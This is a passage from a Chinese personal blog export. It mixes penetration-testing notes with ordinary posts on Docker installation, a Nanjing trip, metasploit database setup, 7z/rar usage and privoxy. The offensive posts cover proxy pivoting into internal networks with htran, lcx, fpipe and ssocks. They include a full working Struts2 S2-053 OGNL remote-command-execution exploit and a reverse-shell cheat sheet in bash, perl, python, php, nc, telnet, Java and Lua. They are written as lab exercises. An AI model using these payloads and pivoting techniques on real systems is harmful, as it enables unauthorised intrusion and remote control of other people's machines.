输入目标IP和端口（此时认为自己是服务器，如果是扫描器则不能输入IP和端口）——》打上对勾——》OK——》（如果不好用，可以指定端口和IP尝试一下）此时再使用刚刚选择的程序，则那个程序全部走指定流量，例如使用mstsc，输入内网机IP（此时自己站在服务器的视角），即可成功连接 也可以直接加载端口扫描器之类的进行内网扫描不使用Proxifier，也可以使用sc32.exe进行端口代理文件——》设置——》SOCKS设置——》SOCKS版本5——》确定新建——》mstsc.exe——》运行]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>代理</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssocks（RCSOCKS代理工具套装）]]></title>
    <url>%2F2017%2F09%2F13%2Fssocks%2F</url>
    <content type="text"><![CDATA[SSOCKS的使用方法记录 SSOCKS（RCSOCKS代理工具套装）这个工具有两个版本：windows和Linux的，可以混用 Windows的直接使用ssocks-win32即可 Linux的需要先进行编译：./configure make ssocksd 用来开启Socks5代理服务 ssocks 本地启用Socks5服务，并反弹到另一IP地址 rcsocks 接收反弹过来的Socks5服务，并转向另一端口 使用说明：Linux中： 12345攻击机上：./rcsocks -l 10086 -p 10010 -vv肉鸡上：./rssocks -vv -s 攻击机IP:10010kali中自带proxychains端口代理工具/etc/proxychains.conf 进行配置（底部）127.0.0.1 socks5 10086proxychains ssh root@ip（此处的IP假设自己是肉鸡） 然后该软件就会走刚设置的端口 windows则需要在cmd中运行，使用方法同Linux类似]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>代理</tag>
        <tag>端口转发</tag>
        <tag>ssocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）]]></title>
    <url>%2F2017%2F09%2F08%2Fst2-053%2F</url>
    <content type="text"><![CDATA[使用docker拉取的环境 Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境（转载）漏洞信息 ● S2-053 公告 获取环境: 1.拉取镜像到本地 1$ docker pull medicean/vulapps:s_struts2_s2-053 2.启动环境 1$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-053 -p 80:8080 前面的 80 代表物理机的端口，可随意指定。 使用与利用 访问 http://你的 IP 地址:端口号/ PoC 1.访问 Demo 页面, 随便输入值，可看到页面输出我们提交的值 2.在输入框中输入 %{100-3}，然后提交，发现 %{} 中的表达式被执行 Exp 命令执行 Exp: 1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;/usr/bin/touch /tmp/vuln&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; 替换Exp中的 (#cmd=’/usr/bin/touch /tmp/vuln’) 中的命令即可 修复建议 升级Apache struts 至 2.5.12 版本 或者 2.3.34 版本 参考链接 S2-053 公告 S2-053 复现分析过程(附POC) 猎户攻防实验室]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
        <tag>st-053</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker的安装、升级与卸载]]></title>
    <url>%2F2017%2F09%2F08%2FdockerInstall%2F</url>
    <content type="text"><![CDATA[如题 安装docker根据官方文档进行的安装配置，以下为copy的官方安装教程。链接：https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#recommended-extra-packages-for-trusty-1404 先决条件要安装Docker CE，需要64位版本的这些Ubuntu版本之一（注意，必须是64位）： Zesty 17.04 Xenial 16.04 (LTS) Trusty 14.04 (LTS) Ubuntu on x86_64（或amd64）armhf，和s390x（IBM Z）体系结构支持Docker CE 。s390x限制：IBM Z仅支持Ubuntu Xenial和Zesty。 卸载旧版本 较老版本的Docker被称为docker或docker-engine。如果这些已安装，请卸载它们： 1$ sudo apt-get remove docker docker-engine docker.io Trusty 14.04推荐额外套餐除非你有很强的理由不要安装这些linux-image-extra-*软件包，否则 Docker可以使用aufs存储驱动程序。 12345$ sudo apt-get update$ sudo apt-get install \ linux-image-extra-$(uname -r) \ linux-image-extra-virtual 对于Ubuntu 16.04及更高版本，Linux内核包括对OverlayFS的支持，Docker CE将overlay2默认使用存储驱动程序。 安装Docker CE您可以根据需要以不同的方式安装Docker CE： 大多数用户 设置了Docker的存储库并从中安装，以方便安装和升级任务。这是推荐的方法。 一些用户下载DEB软件包并 手动安装并手动完成升级。这在诸如在没有访问互联网的空中密码系统上安装Docker的情况下是有用的。 在测试和开发环境中，一些用户选择使用自动化 便利脚本来安装Docker。 使用存储库进行安装在新主机上首次安装Docker CE之前，需要设置Docker存储库。之后，您可以从存储库安装和更新Docker。 设置存储库1.更新apt包索引：1$ sudo apt-get update 2.安装软件包以允许apt通过HTTPS使用存储库：12345$ sudo apt-get install \ apt-transport-https \ ca-certificates \ curl \ software-properties-common 3.添加Docker的官方GPG密钥：1$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 验证键指纹是否正确9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88。123456$ sudo apt-key fingerprint 0EBFCD88pub 4096R/0EBFCD88 2017-02-22Key fingerprint = 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88uid Docker Release (CE deb) &lt;docker@docker.com&gt;sub 4096R/F273FCD8 2017-02-22 4.使用以下命令设置稳定版本库。您始终需要稳定的存储库，即使您也想从边缘或测试存储库安装构建 。要添加边缘或 测试库，请在下面的命令中的单词后添加单词edge或test（或两者）stable。 注意：以下1lsb_release -cs 子命令返回您的Ubuntu发行版的名称，例如xenial。 有时候，在像Linux Mint这样的发行版中，您可能需要更改$(lsb_release -cs) 为您的父级Ubuntu发行版。 例如，如果您正在使用 Linux Mint Rafaela，可以使用trusty。 x86_64：1234$ sudo add-apt-repository \ &quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; armhf：1234$ sudo add-apt-repository \ &quot;deb [arch=armhf] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; s390x：1234$ sudo add-apt-repository \ &quot;deb [arch=s390x] https://download.docker.com/linux/ubuntu \ $(lsb_release -cs) \ stable&quot; 注意：从Docker 17.06开始，稳定的版本也被推到了边缘，并且测试了存储库。 安装DOCKER CE1.更新apt包索引。1$ sudo apt-get update 2.安装最新版本的Docker CE，或者转到下一步安装特定版本。Docker的任何现有安装都被替换。1$ sudo apt-get install docker-ce 有多个Docker存储库？ 如果启用了多个Docker存储库，则无需在apt-get installor或 apt-get update命令中指定版本即可安装或更新，将始终安装尽可能高的版本，这可能不适合您的稳定性需求。 3.在生产系统上，您应该安装特定版本的Docker CE，而不是始终使用最新版本。此输出被截断。列出可用版本。 123$ apt-cache madison docker-cedocker-ce | 17.06.0~ce-0~ubuntu | https://download.docker.com/linux/ubuntu xenial/stable amd64 Packages 列表的内容取决于启用了哪些存储库。选择要安装的特定版本。第二列是版本字符串。第三列是存储库名称，它指示软件包所在的存储库以及其稳定性级别。要安装特定版本，请将版本字符串附加到包名称，并将其分隔为等号（=）： 1$ sudo apt-get install docker-ce=&lt;VERSION&gt; Docker守护程序自动启动。 4.通过运行hello-world 映像验证Docker CE是否正确安装。 1$ sudo docker run hello-world 或者如果你在armhf上运行：1bash $ sudo docker run armhf/hello-world This command downloads a test image and runs it in a container. When thecontainer runs, it prints an informational message and exits. Docker CE已安装并运行。您需要使用sudo来运行Docker命令。继续执行Linux安装后，允许非特权用户运行Docker命令和其他可选配置步骤。 升级DOCKER CE要升级Docker CE，首先运行1sudo apt-get update 然后按照 安装说明，选择要安装的新版本。 从包装中安装如果您不能使用Docker的存储库来安装Docker CE，则可以下载该.deb版本的 文件并手动安装。每次要升级Docker CE时，都需要下载一个新文件。 1.转到https://download.docker.com/linux/ubuntu/dists/，选择你的Ubuntu版本，浏览pool/stable/和选择amd64， armhf或s390x。下载.deb要安装的Docker版本的文件。 注意：要安装边缘 包，stable请将URL中的单词更改 为edge。 了解稳定和边缘渠道。 2.安装Docker CE，将下面的路径更改为您下载Docker软件包的路径。 1$ sudo dpkg -i /path/to/package.deb Docker守护程序自动启动。 3.通过运行hello-world 映像验证Docker CE是否正确安装。 1$ sudo docker run hello-world 此命令下载测试图像并在容器中运行它。当容器运行时，它打印一条信息消息并退出。Docker CE已安装并运行。您需要使用sudo来运行Docker命令。继续执行Linux的安装后步骤，以允许非特权用户运行Docker命令和其他可选配置步骤。 升级DOCKER CE要升级Docker CE，请下载较新的软件包文件并重复 安装过程，指向新文件。 使用方便脚本进行安装 Docker在get.docker.com 和test.docker.com上提供了方便的脚本，用于将Docker CE的稳定和测试版本快速，非交互式安装到开发环境中。脚本的源代码位于 docker-install存储库中。 不建议在生产环境中使用这些脚本，您应该在使用这些脚本之前了解潜在的风险： 脚本需要root或sudo权限才能运行。因此，在运行脚本之前，应仔细检查和审核脚本。 该脚本尝试检测您的Linux发行版和版本，并为您配置您的软件包管理系统。此外，脚本不允许您自定义任何安装参数。这可能导致不受支持的配置，无论是从Docker的角度还是从您自己的组织的准则和标准。 脚本安装包管理器的所有依赖关系和建议，而不要求确认。这可能会安装大量的软件包，具体取决于您的主机的当前配置。 如果Docker已经使用其他机制安装在主机上，则不要使用便利脚本。 此示例使用get.docker.com上的脚本在Linux上安装最新的Docker CE版本。要安装最新的测试版本，请改用test.docker.com。在下面的每个命令，取代每次出现get用test。 警告： 始终检查从互联网下载的脚本，然后再在本地运行。 123$ curl -fsSL get.docker.com -o get-docker.sh$ sudo sh get-docker.sh If you would like to use Docker as a non-root user, you should now consider adding your user to the “docker” group with something like: 1sudo usermod -aG docker your-user Remember that you will have to log out and back in for this to take effect! WARNING: Adding a user to the “docker” group will grant the ability to run containers which can be used to obtain root privileges on the docker host. Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface for more information. Docker CE已安装。它DEB基于分布自动启动。在 RPM基于发行，则需要使用适当的手动启动它systemctl或者service命令。消息显示，非root用户默认情况下无法运行Docker命令。 使用方便脚本后升级DOCKER如果您使用便利脚本安装Docker，则应直接使用您的程序包管理器升级Docker。重新运行方便脚本没有任何优势，如果尝试重新添加已经添加到主机的存储库，可能会导致问题。 卸载Docker CE 卸载Docker CE包： 1$ sudo apt-get purge docker-ce 主机上的图像，容器，卷或自定义配置文件不会自动删除。删除所有图像，容器和卷： 1$ sudo rm -rf /var/lib/docker 您必须手动删除任何已编辑的配置文件。]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京游记]]></title>
    <url>%2F2017%2F09%2F08%2FNanJingYouJi%2F</url>
    <content type="text"><![CDATA[如题，需密码 南京几日记录第一天到南京那天有些累，有些无趣。只是到了就同小金子 苗老师一起到南京师范大学报道，抽个签，领衣服和比赛相关资料等。我们是37号，最后一个，苗老师手气真好。之后就是补觉。 很有感触的是，南方真的到处都是坡，骑自行车真的很难骑！！！ 第二天与小金子一同参加开幕式，开幕式完毕比赛就正式开始。我们回宾馆进行答辩准备，很是辛苦小金子了，需根据上传的ppt敲一份正式的书面讲稿，还要进行背诵。我则是睡了一觉后配合她进行ppt演示。 第三天小金子5点就起床背讲稿了，我则是贪睡到7点。很是惊讶昨日还一句背不通的小金子今早能顺一遍下来，看来她真的很是用心了。据群内志愿者通知，今天上午将结束全部答辩。 我们到南京师大进行答辩。答辩过程也遇到一些问题:小键盘不能用，电脑分辨率有些问题等。评委也是专业，一针见血的指出我们网站存在的一些问题，答辩也算顺利完成，小金子说，我们走的时候，她听到评委在后面比“耶”。 答辩完毕后，回到宾馆休息到1点半后根据小金子同学发来的旅游攻略进行南京各大学游览。游览了南京师范大学随缘校区，南京大学鼓楼校区，东南大学四牌楼校区。三个校区里树木丛生，真正是比北方环境好。个人认为最好的还是南京大学，树木丰茂，建筑则是阁楼风格，很是遗憾没有多拍些照。之后坐地铁到武定门寻小金子同学。其实之前是注意到了的，毕竟人很美，气质卓然，不禁多看了几眼。 那时大致是晚上6点，小金子同学本是打算带我们吃南京大排档，由于排队人数上百而放弃，骑着ofo在南京道路上行进，我是分不清方向的，只能紧跟前人行迹。最后也是不知道在哪里吃的饭，价格是有些贵的，5道菜，价格估计三四百也许更高，小金子同学请客，其实是有些过意不去。之后又转着走了老门东和夫子庙，老门东是南京的各类小吃集结地，没怎么吃，只是尝了些牛肉锅贴和酒酿赤豆元宵，牛肉锅贴味道不错，酒酿赤豆元宵与粥相似，味甜，略不习惯。 夫子庙晚上游玩人数众多，人挤人。小金子同学充分展现了一个老南京的优势，领着我们行进在不知名的小巷，曲曲折折，左突右弯，只是一个简单的拐角，人流便小了四分之三。她领着我们将夫子庙走了个遍，又在秦淮河边看了看。之中有突如其来几场雨，小雨时依旧在路上走着，若是雨水大时便躲进附近小巷屋檐下，也算是见识到南京的雨。游览完已九点多，需得回宾馆。苗老师很是负责，一直关注我们动向。回到宾馆躺到床上时才是真正觉到累，许是之前美女带路动力无穷吧。小金子同学推荐我们明日早些去排南京大牌档，然后可以到新街口转转，那有德基广场，许多小吃可尝。拉灯—- 第四天上午参加优秀作品点评，开头一些作品确是有真材实料，有的指导老师很厉害。有些却是滥竽充数，调用一个API接口，写了一个记事功能，UI设计还那么lj，也能国一？很是愤愤。诧异的发现一个与网络安全相关的项目，发现是一个漏扫，满是激动然并卵。 后续参加闭幕式，不出意外是三等奖。主办方很不人性的是颁奖完后才可领取奖状，约摸4点多时下起雨，越下越大，我们打的回宾馆，到宾馆时雨却将停，有些无奈。由于之前的雨中行进，裤腿湿透。换了条短裤，准备吃南京大牌档。 在公交站牌处等车，半天不见公交，冷风夹杂雨丝，打在身上让人发寒。其中我很是纠结反复了一番，最后结果是在附近随意吃了些，打个的，继续向新街口出发。 德基广场是真的很大，内里分为一期 二期，似是只能在一楼切换。真正是名牌汇聚的大商场，价格很高，我是一件也买不起的。与小金子一同走了许多冤枉路，却也还是走不出个门道，无奈下小金子求助同学，同学很是清楚的讲明哪里有美食。在她的帮助下，我们顺利寻到美食区。 顶层也是有南京大排档，且是第一家，因而人数超多。我们先是取了个号，绕了个圈人数不见少，若是等下去怕是10点才能吃上。所幸小金子进去看了一眼，可以外带。选了一些感兴趣的小吃带回宾馆。品尝到南京大牌档，嗯，的确是蛮好吃的！南京烤鸭油而不腻，满口肉香，烤鸭包与牛肉锅贴口味相似，春卷不是很喜欢，内里放了韭菜，首次试吃臭豆干，感觉还是蛮不错的，还有一个方方正正像松糕一般的，淡淡的甜味，也是喜欢。（麻蛋，饿了）恩，就这样了。]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活记录</tag>
        <tag>南京记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit数据库配置]]></title>
    <url>%2F2017%2F09%2F08%2FmsfdbInit%2F</url>
    <content type="text"><![CDATA[当我们没有配置数据库的时候，使用的是慢速查找，找一个模块往往需要一分钟以上的时间。而我们设置了数据库之后，1秒就能查找到。因此我们来看一下应该怎么配置msf的数据库。 metasploit数据库配置第一步1service postgresql start 启动服务 第二步1msfdb init 初始化msf数据库（默认创建的数据库名：msf，msf_test;用户名：msf；口令默认为空） 第三步1234msfconsole 进入msf控制台db_status 查看数据库连接状态[*] postgresql connected to msfdb_rebuild_cache 重建缓存（该操作需要一定时间，请等待三分钟后再搜索） 完成了，三分钟之后再search一次试试看。如果还是不行，请退出再重开msfconsole试一试]]></content>
      <categories>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
        <tag>msfdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[7z.exe的简单使用方法]]></title>
    <url>%2F2017%2F09%2F06%2Ftool7z%2F</url>
    <content type="text"><![CDATA[如题 7z.exe的简单使用方法-t 指定压缩档案格式。指定压缩档案格式。它们可以是：zip、7z、rar、cab、gzip、bzip2、tar 或其它格式。而 默认值是 7z 格式。 压缩：123456压缩文件夹（保存文件夹结构）：7z.exe a &quot;压缩文件名&quot; &quot;要压缩的文件夹&quot;压缩指定文件类型（exe，无法压缩子文件夹中的文件）：7z.exe a &quot;压缩文件名&quot; &quot;*.exe&quot;参数a： 添加 解压：1234567z x 压缩文件名 -y -aos -o&quot;解压目录&quot;x:完整路径下解压文件-y:所有确认选项都默认为是（即不出现确认提示）-aos:跳过已存在的文件-o:设置输出目录 高级压缩的例子：123456789101112131415161718192021227z a -t7z archive.7z *.exe *.dll -m0=BCJ -m1=LZMA:d=21 -ms -mmt添加 *.exe 及 *.dll 文件到固实压缩档案 archive.7z。使用 LZMA 压缩算法、2 MB 字典大小及 BCJ 转换器。压缩将开启多线程优化(如果可用)。-ms 默认设置固实模式。在创建固实压缩档案模式中，它把压缩档案中的所有文件都当成一个连续数据流来看待。通常情况下，固实压缩可增加压缩比，特别是在添加大量小文件的时候-mmt 默认开启多线程模式。-m0=BCJ -- 第一个备选的压缩算法为BCJ-m1=LZMA:d=21 -- 第二个备选的压缩算法为LZMA，指定字典大小为默认的21(2MB的1次方)2MB。想要使用最大化压缩，可以使用下面的参数选项：7z a -t7z DriverTest_1.7z &quot;I:\t\t1\*&quot; -mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt -r-t7z -- 压缩文件的格式为7z-mx=9 -ms=200m -mf -mhc -mhcf -m0=LZMA:a=2:d=25:mf=bt4b:fb=64 -mmt-- 指定压缩算法选项-mx=9 -- 设置压缩等级为极限压缩（默认为：LZMA 最大算法、32 MB 字典大小、BT4b Match finder、单词大小为 64、BCJ2 过滤器）-ms=200m -- 开启固实模式，设置固实数据流大小为200MB。-mf -- 开启可执行文件压缩过滤器。-mhc -- 开启档案文件头压缩。-mhcf -- 开启档案文件头完全压缩。我所使用的7z版本为4.42&gt;2.30。-m0=LZMA:a=2:d=25:mf=bt4b:fb=64-- 第一个备选压缩算法为LZMA，压缩等级为最大压缩，LZMA算法使用的字典大小为25(2MB的5次方)32MB，算法的匹配器为bt4b(所需要内存为d×9.5 + 34 MB)，压缩算法的紧凑字节为最大模式的64字节。-mmt -- 开启多线程模式。-r -- 递归到所有的子目录。]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>7z.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rar.exe的使用方法]]></title>
    <url>%2F2017%2F09%2F06%2FtoolRar%2F</url>
    <content type="text"><![CDATA[如题 rar.exe的使用方法压缩命令1234567891011121314151617181920212223压缩文件夹（不包含子目录）：rar.exe a &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（包含子目录）：rar.exe a -r &quot;压缩包保存路径文件名&quot; &quot;被压缩的文件夹路径&quot;压缩文件夹（以时间命名压缩包）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径&quot;加密压缩文件夹（以时间命名压缩包，密码：123）：rar.exe a -ag -r -s -ibck -p123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;带文件头的加密压缩：rar.exe a -ag -r -s -ibck -HP123 &quot;压缩包保存路径&quot; &quot;被压缩的文件夹路径&quot;压缩多个文件（以时间命名压缩包）：rar.exe a -ag -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;文件名1&quot; &quot;文件名2&quot;压缩指定文件类型（exe）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*.exe&quot;压缩含有指定字符的文件（匹配test）：rar.exe a -ag -r -s -ibck &quot;压缩包保存路径（记得在最后加\）&quot; &quot;被压缩的文件夹路径\*test*&quot; 解压命令1234567891011解压RAR到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot;解压RAR到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; -AD &quot;指定目录&quot;解压RAR中指定文件类型（exe）到当前目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe解压RAR中指定文件类型（exe）到指定目录（无提示带路径）：rar.exe X -Y &quot;压缩文件名&quot; *.exe -AD &quot;指定目录&quot; [语法]123RAR &lt;命令&gt; [ -&lt;开关1&gt; -&lt;开关N&gt; ] &lt;压缩文件&gt; [ &lt;@列表文件...&gt; ]RAR [ &lt;文件...&gt; ] [ &lt;解压路径/&gt; ] 简要参数说明：12345678910111213141516171819a :备份所有文件；-ag :当创建压缩文件时，以格式“YYYYMMDDHHMMSS”附加当前日期字符串,文件名YYYYMMDDHHMMSS.rar；-k :锁定压缩文件；-r:备份目录和子目录；-s :创建固实压缩文件，提高压缩率；-ibck :后台运行；X ：从压缩包中带绝对路径解压指定文件到当前路径-Y ：覆盖已存在文件-p ：加密压缩，解压时需要密码-HP ：带文件头加密，更安全，没有密码无法查看里面的文件列表]]></content>
      <categories>
        <category>工具使用说明</category>
      </categories>
      <tags>
        <tag>工具使用说明</tag>
        <tag>rar.exe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网攻击环境模拟（端口转发）]]></title>
    <url>%2F2017%2F09%2F05%2FportForward%2F</url>
    <content type="text"><![CDATA[如题 内网攻击环境模拟（端口转发）测试工具：123456789htran3fpipelcxnc（linux、windows）bashpythonphpnc 无essh代理 总体环境概况（总的环境，具体每个工具使用时可能会有所出入）： 123456攻击机：ubu_ter 192.168.20.149攻击机：win10 192.168.20.191 192.168.20.76服务器：ubu_blog 192.168.20.111 192.168.174.11服务器：server2003 192.168.174.129 192.168.20.181目标机：Ubuntu2 192.168.174.128目标机：winXP 192.168.174.130 实验一、使用htran.exe远程登录目标winXP的33891234567891011**环境：**攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**攻击机win10上执行：htran3.exe -Listen 9999 8888服务器server2003上执行：htran3.exe -slave 192.168.20.191 9999 192.168.174.130 3389用法：htr3.exe -slave 攻击机IP 攻击机监听端口 目标机IP 目标机端口将目标机的3389端口转发到本地的8888端口，使用另一台攻击机Ubuntu2的rdesktop连接win10的8888端口即可 实验二、使用fpipe远程登录目标winXP的338912345678910111213**环境：**攻击机（VPS，公网）：win10 192.168.20.191 192.168.20.76攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器上执行：fpipe.exe -l 1234 -s 1000 -r 3389 192.168.174.130意思是将发送到服务器本机1000端口的链接通过1234端口被重定向到了目标机IP的3389端口上，然后再链接服务器的1234端口，即可链接到目标机的3389上然后在攻击机上使用mstsc链接192.168.20.181:1234疑惑：在攻击机win10上使用mstsc进行链接，刚建立连接就会断开在攻击机ubuntu2上使用rdesktop进行链接，成功建立长时间连接 实验三、使用lcx远程登录目标winXP的3389123456789101112**环境：**攻击机（VPS，公网）：win10 192.168.20.191 攻击机（个人笔记本，内网）：Ubuntu2 192.168.20.145服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**先在win10上：lcx.exe -listen 51 3389监听51端口，转发到本机的3389端口然后在服务器上执行：lcx.exe -slave 192.168.20.191 51 192.168.174.130 3389将目标机winXP的3389转发到攻击机win10（VPS）的51端口上在攻击机Ubuntu2上：rdesktop 192.168.20.191:3389 实验四、使用nc得到服务器server2003的cmdShell12345678**环境：**攻击机：win10 192.168.20.191 服务器（公网，目标内网）：server2003 192.168.174.129 192.168.20.181目标机（目标内网）：winXP 192.168.174.130**步骤：**在服务器server2003上：nc -l -p 8888 -t -e cmd.exe（-t参数可省略）在攻击机win10上：nc -nvv 192.168.20.181 8888 实验五、使用nc得到服务器ubu_blog的shell12345678910111213141516171819202122232425262728293031323334353637**环境：**攻击机：Ubuntu2 192.168.20.145服务器：ubu_blog 192.168.20.111 192.168.174.11目标机：Ubuntu2 192.168.174.128**步骤：**在攻击机Ubuntu2上：nc -lvv 1234（如果有错再添加0.0.0.0，windows不行，-lvnp也可以）在服务器ubu_blog上：（1）bash版本bash -i &gt;&amp;/dev/tcp/192.168.20.149/1234 0&gt;&amp;1或： /bin/bash -i &gt; /dev/tcp/192.168.20.149/1234 0&lt;&amp;1 2&gt;&amp;1（2）perl版本perl -e &apos;use Socket;$i=&quot;192.168.20.149&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;（3）python版本python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.20.149&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;（4）php版本php -r &apos;$sock=fsockopen(&quot;192.168.20.149&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;（5）nc -e /bin/sh 192.168.20.149 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.20.149 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999（6）JAVA版本（不会用）r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.20.149/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()（7）LUA版本（尝试失败）lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;192.168.20.149&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;（8）Hacker:nc -lvnp listenportVictim:mknod /tmp/backpipe pVictim:/bin/sh 0&lt;/tmp/backpipe | nc 192.168.20.149 1234 1&gt;/tmp/backpipe（9）不使用ncMethod 2:Hacker: nc -nvlpp8080Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe（10）Method 3:（尝试失败）Hacker: nc -nvlp 8080Hacker: nc -nvlp 8888Victim: telnet 192.168.20.149 8080 | /bin/bash | telnet 192.168.20.149 8888 实验六、SSH代理（putty）1234567891011**环境：**代理服务器：ubu_ter 192.168.17.128（仅主机模式，不可上网）本地机：win10 192.168.20.191（可上网），192.168.17.1**步骤：**打开putty的会话界面，填入主机名称和端口然后在左侧：连接——》SSH——》通道——》增加端口：7070，动态——》打开输入用户名和密码，登陆成功此时打开cmd，输入netstat -an，可以看到这么一条打开浏览器，在浏览器中设置代理：socks5 127.0.0.1:7070此时浏览器变得无法上网，设置成功]]></content>
      <categories>
        <category>端口转发</category>
      </categories>
      <tags>
        <tag>代理</tag>
        <tag>端口转发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用privoxy将socks转换为http代理]]></title>
    <url>%2F2017%2F09%2F04%2FsocksTOhttp%2F</url>
    <content type="text"><![CDATA[shadowsocks是socks5代理，但有的程序不支持socks代理（终端），只支持HTTP代理，怎么办呢？这个时候我们就需要将socks代理转换为http代理了。 linux下使用privoxy将socks转为http代理privoxy具有将socks代理转为http代理的功能。 1.开启shadowsocks根据自己SS的配置来 2.安装privoxy。1$ sudo apt-get install privoxy 3.更改provoxy配置12345位置在“/etc/privoxy/config”。$ sudo vim /etc/privoxy/config在里面添加：forward-socks5 / 127.0.0.1:1080 .listen-address localhost:8118 4.重启privoxy。1$ service privoxy restart 5.现在就可以使用http代理1http_proxy=http://localhost:8118 curl ip.gs 查看当前ip。 终端想使用代理就在每条命令前加上“http_proxy=http://localhost:8118”即可]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>代理</tag>
        <tag>privoxy</tag>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vi使用笔记]]></title>
    <url>%2F2017%2F09%2F04%2Fvi-sum-up%2F</url>
